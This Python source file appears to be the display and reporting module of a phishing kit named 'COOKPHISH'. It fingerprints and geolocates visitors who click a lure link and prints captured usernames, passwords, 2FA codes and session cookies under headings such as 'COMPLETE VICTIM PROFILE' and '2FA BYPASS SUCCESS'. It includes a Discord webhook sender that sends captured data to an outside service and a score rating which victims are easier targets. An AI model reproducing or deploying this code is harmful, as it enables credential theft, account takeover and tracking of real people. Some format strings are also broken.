import json
import requests
import re
from colorama import Fore, Style
from dotenv import load_dotenv
import os
from user_agents import parse

load_dotenv()
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

def send_webhook_message(message):
    webhook_url = DISCORD_WEBHOOK_URL
    if webhook_url == "":
        return "Webhook url is empty"
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")

def advanced_ip_info(ip_address):
    """Get advanced IP information using multiple APIs"""
    ip_data = {
        'ip': ip_address,
        'country': 'Unknown',
        'city': 'Unknown',
        'region': 'Unknown',
        'isp': 'Unknown',
        'org': 'Unknown',
        'as': 'Unknown',
        'timezone': 'Unknown',
        'lat': 'Unknown',
        'lon': 'Unknown',
        'postal': 'Unknown',
        'threat_level': 'Unknown',
        'proxy_detected': False,
        'vpn_detected': False
    }
    
    # Skip private/local IPs
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        ip_data.update({
            'country': 'Local Network',
            'city': 'Local',
            'isp': 'Local Network',
            'timezone': 'Local'
        })
        return ip_data
    
    try:
        # Primary API - ipapi.co (free, reliable)
        response = requests.get(f'https://ipapi.co/{ip_address}/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            ip_data.update({
                'country': data.get('country_name', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'isp': data.get('org', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'lat': data.get('latitude', 'Unknown'),
                'lon': data.get('longitude', 'Unknown'),
                'postal': data.get('postal', 'Unknown')
            })
    except:
        pass
    
    try:
        # Backup API - ip-api.com
        if ip_data['country'] == 'Unknown':
            response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                ip_data.update({
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'as': data.get('as', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown'),
                    'lat': data.get('lat', 'Unknown'),
                    'lon': data.get('lon', 'Unknown'),
                    'postal': data.get('zip', 'Unknown'),
                    'proxy_detected': data.get('proxy', False)
                })
    except:
        pass
    
    return ip_data

def device_fingerprint(user_agent):
    """Extract detailed device information from user agent"""
    if not user_agent:
        return {
            'device_type': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'device_brand': 'Unknown',
            'device_model': 'Unknown'
        }
    
    try:
        parsed_ua = parse(user_agent)
        
        # Determine device type
        if parsed_ua.is_mobile:
            device_type = 'Mobile'
        elif parsed_ua.is_tablet:
            device_type = 'Tablet'
        elif parsed_ua.is_pc:
            device_type = 'Desktop'
        elif parsed_ua.is_bot:
            device_type = 'Bot'
        else:
            device_type = 'Unknown'
        
        # Extract OS information
        os_name = parsed_ua.os.family
        os_version = parsed_ua.os.version_string
        
        # Extract device brand and model (for mobile devices)
        device_brand = parsed_ua.device.brand or 'Unknown'
        device_model = parsed_ua.device.model or 'Unknown'
        
        # Additional checks for specific patterns
        if 'iPhone' in user_agent:
            device_brand = 'Apple'
            device_type = 'Mobile'
            if 'iPhone' in user_agent:
                model_match = re.search(r'iPhone(\d+,\d+)', user_agent)
                if model_match:
                    device_model = f'iPhone {model_match.group(1)}'
        
        elif 'Samsung' in user_agent:
            device_brand = 'Samsung'
            model_match = re.search(r'SM-([A-Z0-9]+)', user_agent)
            if model_match:
                device_model = f'Samsung {model_match.group(1)}'
        
        return {
            'device_type': device_type,
            'os': f"{os_name} {os_version}",
            'os_family': os_name,
            'os_version': os_version,
            'device_brand': device_brand,
            'device_model': device_model,
            'is_mobile': parsed_ua.is_mobile,
            'is_tablet': parsed_ua.is_tablet,
            'is_pc': parsed_ua.is_pc,
            'is_bot': parsed_ua.is_bot
        }
    
    except Exception as e:
        # Fallback manual parsing
        device_info = {
            'device_type': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'device_brand': 'Unknown',
            'device_model': 'Unknown'
        }
        
        # Basic OS detection
        if 'Windows' in user_agent:
            device_info['os'] = 'Windows'
            device_info['device_type'] = 'Desktop'
        elif 'Mac OS' in user_agent or 'macOS' in user_agent:
            device_info['os'] = 'macOS'
            device_info['device_type'] = 'Desktop'
        elif 'iPhone' in user_agent:
            device_info['os'] = 'iOS'
            device_info['device_type'] = 'Mobile'
            device_info['device_brand'] = 'Apple'
        elif 'Android' in user_agent:
            device_info['os'] = 'Android'
            device_info['device_type'] = 'Mobile'
        elif 'Linux' in user_agent:
            device_info['os'] = 'Linux'
            device_info['device_type'] = 'Desktop'
        
        return device_info

def browser_analysis(user_agent, headers):
    """Analyze browser information and capabilities"""
    if not user_agent:
        return {'browser': 'Unknown', 'version': 'Unknown'}
    
    try:
        parsed_ua = parse(user_agent)
        browser_name = parsed_ua.browser.family
        browser_version = parsed_ua.browser.version_string
        
        # Detect browser engine
        engine = 'Unknown'
        if 'WebKit' in user_agent:
            engine = 'WebKit'
        elif 'Gecko' in user_agent:
            engine = 'Gecko'
        elif 'Trident' in user_agent:
            engine = 'Trident'
        elif 'Blink' in user_agent:
            engine = 'Blink'
        
        # Analyze browser capabilities from headers
        capabilities = {
            'javascript': True,  # Assume enabled
            'cookies': True,     # Assume enabled
            'webgl': 'Unknown',
            'canvas': 'Unknown'
        }
        
        # Check for Do Not Track
        dnt = headers.get('DNT', '0') == '1'
        
        # Check accept headers
        accept_encoding = headers.get('Accept-Encoding', '')
        accept_language = headers.get('Accept-Language', '')
        
        return {
            'browser': browser_name,
            'version': browser_version,
            'engine': engine,
            'full_version': parsed_ua.browser.version,
            'capabilities': capabilities,
            'do_not_track': dnt,
            'accept_encoding': accept_encoding,
            'accept_language': accept_language,
            'sec_fetch_site': headers.get('Sec-Fetch-Site', 'Unknown'),
            'sec_fetch_mode': headers.get('Sec-Fetch-Mode', 'Unknown'),
            'sec_fetch_dest': headers.get('Sec-Fetch-Dest', 'Unknown')
        }
    
    except Exception as e:
        # Fallback manual parsing
        browser_info = {'browser': 'Unknown', 'version': 'Unknown', 'engine': 'Unknown'}
        
        if 'Chrome' in user_agent and 'Safari' in user_agent:
            browser_info['browser'] = 'Chrome'
            version_match = re.search(r'Chrome/(\d+\.\d+)', user_agent)
            if version_match:
                browser_info['version'] = version_match.group(1)
        elif 'Firefox' in user_agent:
            browser_info['browser'] = 'Firefox'
            version_match = re.search(r'Firefox/(\d+\.\d+)', user_agent)
            if version_match:
                browser_info['version'] = version_match.group(1)
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            browser_info['browser'] = 'Safari'
            version_match = re.search(r'Version/(\d+\.\d+)', user_agent)
            if version_match:
                browser_info['version'] = version_match.group(1)
        elif 'Edge' in user_agent:
            browser_info['browser'] = 'Edge'
            version_match = re.search(r'Edge/(\d+\.\d+)', user_agent)
            if version_match:
                browser_info['version'] = version_match.group(1)
        
        return browser_info

def platform_detection(user_agent, headers):
    """Detect the platform/app from which the user clicked the link"""
    referrer = headers.get('Referer', '').lower()
    user_agent_lower = user_agent.lower() if user_agent else ''
    
    platform_info = {
        'source_platform': 'Direct',
        'in_app_browser': False,
        'app_version': 'Unknown',
        'referrer_domain': 'None'
    }
    
    # Extract referrer domain
    if referrer:
        try:
            from urllib.parse import urlparse
            parsed_url = urlparse(referrer)
            platform_info['referrer_domain'] = parsed_url.netloc
        except:
            pass
    
    # Platform detection based on user agent
    if 'fban' in user_agent_lower or 'fbav' in user_agent_lower:
        platform_info.update({
            'source_platform': 'Facebook',
            'in_app_browser': True
        })
        # Extract Facebook app version
        version_match = re.search(r'FBAV/(\d+\.\d+\.\d+)', user_agent)
        if version_match:
            platform_info['app_version'] = version_match.group(1)
    
    elif 'instagram' in user_agent_lower:
        platform_info.update({
            'source_platform': 'Instagram',
            'in_app_browser': True
        })
        # Extract Instagram app version
        version_match = re.search(r'Instagram (\d+\.\d+\.\d+)', user_agent)
        if version_match:
            platform_info['app_version'] = version_match.group(1)
    
    elif 'whatsapp' in user_agent_lower:
        platform_info.update({
            'source_platform': 'WhatsApp',
            'in_app_browser': True
        })
    
    elif 'tiktok' in user_agent_lower:
        platform_info.update({
            'source_platform': 'TikTok',
            'in_app_browser': True
        })
    
    elif 'twitter' in user_agent_lower or 'twitterandroid' in user_agent_lower:
        platform_info.update({
            'source_platform': 'Twitter/X',
            'in_app_browser': True
        })
    
    elif 'linkedin' in user_agent_lower:
        platform_info.update({
            'source_platform': 'LinkedIn',
            'in_app_browser': True
        })
    
    elif 'telegram' in user_agent_lower:
        platform_info.update({
            'source_platform': 'Telegram',
            'in_app_browser': True
        })
    
    # Check referrer for additional platform detection
    elif 'facebook.com' in referrer:
        platform_info['source_platform'] = 'Facebook Web'
    elif 'instagram.com' in referrer:
        platform_info['source_platform'] = 'Instagram Web'
    elif 'twitter.com' in referrer or 'x.com' in referrer:
        platform_info['source_platform'] = 'Twitter/X Web'
    elif 'linkedin.com' in referrer:
        platform_info['source_platform'] = 'LinkedIn Web'
    elif 'youtube.com' in referrer:
        platform_info['source_platform'] = 'YouTube'
    elif 'google.com' in referrer:
        platform_info['source_platform'] = 'Google Search'
    elif 'bing.com' in referrer:
        platform_info['source_platform'] = 'Bing Search'
    
    return platform_info

def first_art(collected_data):
    """Display beautiful visitor information on terminal"""
    data = collected_data
    ip_info = data.get('ip_info', {})
    device_info = data.get('device_info', {})
    browser_info = data.get('browser_info', {})
    platform_info = data.get('platform_info', {})
    
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}🎯 NEW TARGET DETECTED! 🎯{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    
    # Visitor Information Box
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📊 VISITOR INFORMATION")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    print(f"│{Fore.GREEN} Timestamp:{' '*10}{Style.RESET_ALL}{Fore.WHITE}{data['timestamp']:<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Session ID:{' '*9}{Style.RESET_ALL}{Fore.WHITE}{str(hash(data['ip_address'] + data['timestamp']))[-12:]:<55}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    # IP & Location Information
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🌍 GEOLOCATION & NETWORK INTELLIGENCE")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    print(f"│{Fore.GREEN} IP Address:{' '*8}{Style.RESET_ALL}{Fore.CYAN}{data['ip_address']:<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Country:{' '*11}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('country', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Region/State:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('region', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} City:{' '*14}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('city', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Postal Code:{' '*7}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('postal', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} ISP/Provider:{' '*6}{Style.RESET_ALL}{Fore.YELLOW}{ip_info.get('isp', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Organization:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('org', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} AS Number:{' '*9}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('as', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Timezone:{' '*10}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('timezone', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Coordinates:{' '*7}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('lat', 'Unknown')}, {ip_info.get('lon', 'Unknown'):<45}{Fore.BLUE}│")
    if ip_info.get('proxy_detected'):
        print(f"│{Fore.RED} Proxy Detected:{' '*5}{Style.RESET_ALL}{Fore.RED}YES{' '*52}{Fore.BLUE}│")
    else:
        print(f"│{Fore.GREEN} Proxy Detected:{' '*5}{Style.RESET_ALL}{Fore.GREEN}NO{' '*53}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    # Device Information
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📱 DEVICE & HARDWARE FINGERPRINT")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    print(f"│{Fore.GREEN} Device Type:{' '*7}{Style.RESET_ALL}{Fore.CYAN}{device_info.get('device_type', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Operating System:{' '*2}{Style.RESET_ALL}{Fore.WHITE}{device_info.get('os', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Device Brand:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{device_info.get('device_brand', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Device Model:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{device_info.get('device_model', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Mobile Device:{' '*5}{Style.RESET_ALL}{Fore.WHITE}{'Yes' if device_info.get('is_mobile') else 'No':<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Tablet Device:{' '*5}{Style.RESET_ALL}{Fore.WHITE}{('Yes' if device_info.get('is_tablet') else 'No'): <55}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    # Browser Information
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🌐 BROWSER & CAPABILITIES ANALYSIS")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    print(f"│{Fore.GREEN} Browser:{' '*11}{Style.RESET_ALL}{Fore.CYAN}{browser_info.get('browser', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Version:{' '*11}{Style.RESET_ALL}{Fore.WHITE}{browser_info.get('version', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Engine:{' '*12}{Style.RESET_ALL}{Fore.WHITE}{browser_info.get('engine', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Do Not Track:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{'Enabled' if browser_info.get('do_not_track') else 'Disabled':<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Accept Language:{' '*3}{Style.RESET_ALL}{Fore.WHITE}{browser_info.get('accept_language', 'Unknown')[:50]:<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Accept Encoding:{' '*3}{Style.RESET_ALL}{Fore.WHITE}{browser_info.get('accept_encoding', 'Unknown')[:50]:<55}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    # Platform Detection
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🔗 PLATFORM & SOURCE ANALYSIS")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    print(f"│{Fore.GREEN} Source Platform:{' '*3}{Style.RESET_ALL}{Fore.CYAN}{platform_info.get('source_platform', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} In-App Browser:{' '*4}{Style.RESET_ALL}{Fore.WHITE}{'Yes' if platform_info.get('in_app_browser') else 'No':<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} App Version:{' '*7}{Style.RESET_ALL}{Fore.WHITE}{platform_info.get('app_version', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Referrer:{' '*10}{Style.RESET_ALL}{Fore.WHITE}{data.get('referrer', 'Direct')[:50]:<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Referrer Domain:{' '*3}{Style.RESET_ALL}{Fore.WHITE}{platform_info.get('referrer_domain', 'None'):<55}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    # User Agent (truncated for display)
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🔍 USER AGENT STRING")
    print(f"{Fore.BLUE}┌{'─'*78}┐")
    ua_display = data.get('user_agent', 'Unknown')[:150] + '...' if len(data.get('user_agent', '')) > 150 else data.get('user_agent', 'Unknown')
    # Split long user agent into multiple lines
    ua_lines = [ua_display[i:i+70] for i in range(0, len(ua_display), 70)]
    for line in ua_lines:
        print(f"│{Fore.GRAY} {line:<77}{Fore.BLUE}│")
    print(f"└{'─'*78}┘{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}{Style.BRIGHT}✅ Visitor data collected and logged successfully!")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

def show_complete_data(collected_data, status):
    """Show complete data when credentials are submitted"""
    data = collected_data
    ip_info = data.get('ip_info', {})
    device_info = data.get('device_info', {})
    browser_info = data.get('browser_info', {})
    platform_info = data.get('platform_info', {})
    
    # Status-based colors and messages
    if status == 'SUCCESS':
        status_color = Fore.GREEN
        status_icon = "🎉 SUCCESSFUL LOGIN"
        message_color = Fore.GREEN
    elif status == '2FA_REQUIRED':
        status_color = Fore.YELLOW
        status_icon = "🔐 2FA REQUIRED"
        message_color = Fore.YELLOW
    elif status == '2FA_SUCCESS':
        status_color = Fore.GREEN
        status_icon = "🎯 2FA BYPASS SUCCESS"
        message_color = Fore.GREEN
    else:  # FAILED
        status_color = Fore.RED
        status_icon = "❌ LOGIN FAILED"
        message_color = Fore.RED
    
    print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
    print(f"{status_color}{Style.BRIGHT}{status_icon}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
    
    # Credentials Box
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}🔑 CAPTURED CREDENTIALS")
    print(f"{Fore.BLUE}┌{'─'*88}┐")
    print(f"│{Fore.GREEN} Username:{' '*12}{Style.RESET_ALL}{Fore.CYAN}{data.get('username', 'N/A'):<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Password:{' '*12}{Style.RESET_ALL}{Fore.CYAN}{data.get('password', 'N/A'):<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Attempt Time:{' '*8}{Style.RESET_ALL}{Fore.WHITE}{data.get('credentials_timestamp', 'N/A'):<70}{Fore.BLUE}│")
    if '2FA' in status and data.get('2fa_code'):
        print(f"│{Fore.GREEN} 2FA Code:{' '*12}{Style.RESET_ALL}{Fore.CYAN}{data.get('2fa_code', 'N/A'):<70}{Fore.BLUE}│")
        print(f"│{Fore.GREEN} 2FA Method:{' '*10}{Style.RESET_ALL}{Fore.WHITE}{data.get('2fa_method', 'N/A'):<70}{Fore.BLUE}│")
    if data.get('cookies'):
        print(f"│{Fore.GREEN} Session Cookie:{' '*6}{Style.RESET_ALL}{Fore.YELLOW}{'Available (logged separately)':<50}{Fore.BLUE}│")
    print(f"└{'─'*88}┘{Style.RESET_ALL}")
    
    # Complete Victim Profile
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}👤 COMPLETE VICTIM PROFILE")
    print(f"{Fore.BLUE}┌{'─'*88}┐")
    print(f"│{Fore.GREEN} Target IP:{' '*11}{Style.RESET_ALL}{Fore.CYAN}{data['ip_address']:<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Location:{' '*12}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown'):<58}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} ISP:{' '*17}{Style.RESET_ALL}{Fore.WHITE}{ip_info.get('isp', 'Unknown'):<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Device:{' '*14}{Style.RESET_ALL}{Fore.WHITE}{device_info.get('device_type', 'Unknown')} - {device_info.get('os', 'Unknown'):<55}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Browser:{' '*13}{Style.RESET_ALL}{Fore.WHITE}{browser_info.get('browser', 'Unknown')} {browser_info.get('version', ''):<60}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Platform Source:{' '*5}{Style.RESET_ALL}{Fore.CYAN}{platform_info.get('source_platform', 'Unknown'):<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} First Visit:{' '*9}{Style.RESET_ALL}{Fore.WHITE}{data['timestamp']:<70}{Fore.BLUE}│")
    print(f"└{'─'*88}┘{Style.RESET_ALL}")
    
    # Risk Assessment
    risk_score = calculate_risk_score(data)
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}⚠️  SECURITY RISK ASSESSMENT")
    print(f"{Fore.BLUE}┌{'─'*88}┐")
    print(f"│{Fore.GREEN} Risk Score:{' '*10}{Style.RESET_ALL}{get_risk_color(risk_score)}{risk_score}/100:<70{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Proxy/VPN:{' '*11}{Style.RESET_ALL}{Fore.RED if ip_info.get('proxy_detected') else Fore.GREEN}{'Detected' if ip_info.get('proxy_detected') else 'Not Detected':<70}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Device Security:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{'High' if device_info.get('is_pc') else 'Medium' if device_info.get('is_tablet') else 'Low':<70}}}{Fore.BLUE}│")
    print(f"│{Fore.GREEN} Browser Privacy:{' '*6}{Style.RESET_ALL}{Fore.WHITE}{'High' if browser_info.get('do_not_track') else 'Low'}:<70>{Fore.BLUE}│")
    print(f"└{'─'*88}┘{Style.RESET_ALL}")
    
    print(f"\n{message_color}{Style.BRIGHT}✅ Complete victim profile captured and logged!")
    print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")

def calculate_risk_score(data):
    """Calculate a risk score based on collected data"""
    score = 50  # Base score
    
    # IP-based scoring
    if data.get('ip_info', {}).get('proxy_detected'):
        score += 20  # Higher risk if using proxy
    
    # Device-based scoring
    device_info = data.get('device_info', {})
    if device_info.get('is_mobile'):
        score += 10  # Mobile devices are easier targets
    elif device_info.get('is_pc'):
        score -= 5   # Desktop users might be more tech-savvy
    
    # Browser-based scoring
    browser_info = data.get('browser_info', {})
    if browser_info.get('do_not_track'):
        score -= 10  # Privacy-conscious user
    
    # Platform-based scoring
    platform_info = data.get('platform_info', {})
    if platform_info.get('in_app_browser'):
        score += 15  # In-app browsers are more vulnerable
    
    # Clamp score between 0 and 100
    return max(0, min(100, score))

def get_risk_color(score):
    """Get color based on risk score"""
    if score >= 80:
        return Fore.RED
    elif score >= 60:
        return Fore.YELLOW
    else:
        return Fore.GREEN

def capture_information(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()
    last_lines = lines[-n:]
    filtered_lines = [line for line in last_lines if line.strip()]
    filtered_lines_str = ""
    for line in filtered_lines:
        if "Username" in line:
            filtered_lines_str += "--------------------------------------\n"
        filtered_lines_str += line 
    filtered_lines_str += "--------------------------------------"
    return filtered_lines_str

def edit_cookies(cookies):
    cookies = json.loads(cookies)
    new_cookies = f"\nsessionid:  {cookies['sessionid']}"
    return new_cookies

def correct_all(username, password, cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
            Successful login
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------
| sessionid:  {Fore.GREEN}{cookies[1]}
{Fore.YELLOW}---------------------------------------------"""
    print(message)

def wrong_answer(username, password):
    message = f"""{Style.BRIGHT}{Fore.RED}
            Username or Password wrong
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.RED}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.RED}{password}                                                              
{Fore.YELLOW} --------------------------------------------"""
    print(message)

def twoFA_active(username, password):
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
        Username and Password are correct but 2FA is active.
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------

        Waiting for two-factor verification...
"""
    print(message)

def twoFA_correct(cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
        Two-factor verification completed.
{Fore.YELLOW} --------------------------------------------
| Sessionid:   {Fore.GREEN}{cookies[1]}                                               
{Fore.YELLOW} --------------------------------------------"""
    print(message)

def banner1():
    banner = f"""{Fore.CYAN}{Style.BRIGHT} _____                                                     _____ 
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║     ██║   ██║██║   ██║█████╔╝ ██████╔╝███████║██║███████╗███████║
 ██║     ██║   ██║██║   ██║██╔═██╗ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝{Fore.RESET}{Fore.YELLOW}
                                                    Professional v2.0\n
{Fore.RED}    
"""
    print(banner)
